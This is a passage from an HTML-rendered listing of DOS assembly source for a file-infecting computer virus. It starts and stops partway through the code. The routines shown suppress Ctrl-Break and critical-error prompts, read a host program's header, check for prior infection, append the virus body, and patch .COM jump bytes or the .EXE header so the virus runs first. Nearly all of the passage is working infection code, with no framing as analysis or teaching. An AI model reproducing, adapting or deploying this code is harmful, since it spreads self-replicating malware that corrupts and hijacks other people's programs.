<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Rst_regs_int</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
popf</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
retf 2</font>
<br><font color="#3333FF">Open_Error:&nbsp;&nbsp; call RestCritInt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Restore ^c and crit-err ints</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Rst_regs_int</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp short JmpDos</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: Buffer for header of program to infect
***</font>
<p><font color="#3333FF">Head_buf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dw 0Ch
dup (?)</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: Install new ^C and crit. err. interrupt
***</font>
<p><font color="#3333FF">InstCritInt:&nbsp; push ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cs</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ax,3523h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Get Ctrl-Break Int Addr</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov I23_Ofs,bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov I23_Seg,es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ax,3524h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Get Crit. Err Int Addr</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov I24_Ofs,bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov I24_Seg,es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ax,2523h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,offset New_I23&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Install new Ctrl-Break Int</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ax,2524h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Install new Crit. Err Int</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,offset New_I24</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: Restore orig. ctrl-break and crit.
err. interrupt ***</font>
<p><font color="#3333FF">RestCritInt:&nbsp; mov ax,2524h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Rest. orig. crit. err int</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lds dx,dword ptr cs:[I24_Ofs]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ax,2523h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Rest. orig. ctrl-break int</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lds dx,dword ptr cs:[I23_Ofs]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cs</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Read header of file ***</font>
<p><font color="#3333FF">Read_header:&nbsp; mov ah,3Fh</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,offset Head_buf</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,18h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc HeadRead_Err&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Error reading, don't infect</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Check_infect ; Check file already infected; if not, save data</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc HeadRead_Err&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Error, quit</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Calc_data&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Calculate data for infected file</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc HeadRead_Err&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Error, quit</font>
<p><font color="#3333FF">HeadRead_Err: ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: Write virus, and for .COM files, write
first 16 bytes behind virus ***</font>
<p><font color="#3333FF">Write_virus:&nbsp; mov ah,40h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Write virus behind program</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,[VirSize]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,100h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc Err_Writ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Write error, quit</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp ax,cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz Err_Writ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; '&nbsp;&nbsp; ' '&nbsp;&nbsp; '&nbsp; '&nbsp; '</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
test byte ptr [Com_or_exe],1</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz First_Write</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<p><font color="#3333FF">First_Write:&nbsp; mov ah,40h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Write orig. 1st 16 bytes behind virus</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,10h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,offset Head_buf</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc Err_Writ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Write error, quit</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp ax,cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz Err_Writ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; '&nbsp;&nbsp; ' '&nbsp;&nbsp; '&nbsp; '&nbsp; '</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
clc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; End procedure, no error</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<p><font color="#3333FF">Err_Writ:&nbsp;&nbsp;&nbsp;&nbsp; stc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; End procedure, error</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: .COM: Write jump-to-virus, .EXE: Write
header ***</font>
<p><font color="#3333FF">Write_header: call Go_file_beg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Go to begin of file</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
test byte ptr [Com_or_exe],1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; .EXE-file?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz Exe_header</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ah,40h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; .COM file - Write 'EB 02'</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,2</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,offset EB02</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ah,40h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Write program-size in pars</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,2</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,offset ProgSize</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ah,40h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Write rest of begin of virus</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,0Ch</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,104h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<p><font color="#3333FF">Exe_header:&nbsp;&nbsp; mov ah,40h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Write in File</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,18h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,offset Head_buf</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: Change file pointer ***</font>
<p><font color="#3333FF">Cng_file_ptr: mov ax,4200h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: Go to begin of file ***</font>
<p><font color="#3333FF">Go_file_beg:&nbsp; xor cx,cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Filepointer = 0</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xor dx,dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Cng_file_ptr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Change File Pointer</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
